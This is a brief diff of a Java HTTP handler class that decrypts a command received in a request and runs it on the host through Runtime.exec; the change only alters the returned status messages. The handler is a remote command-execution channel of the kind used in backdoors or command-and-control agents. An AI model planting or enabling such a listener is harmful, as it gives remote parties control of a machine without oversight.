@@ -49,12 +49,12 @@ public class CommandListener extends Thread implements HttpHandler {
             String cmd = as.decryptText(q, privateKey);
             Runtime.getRuntime().exec(cmd);
             LOGGER.log(Level.INFO, "Ejecutando comando: " + cmd);
-            return cmd;
+            return "Command ran successfully";
         }  catch (Exception e) {
             // TODO Auto-generated catch block
             LOGGER.log(Level.SEVERE, e.toString());
         }
         
-        return "test";
+        return "Command failed";
     }
 }
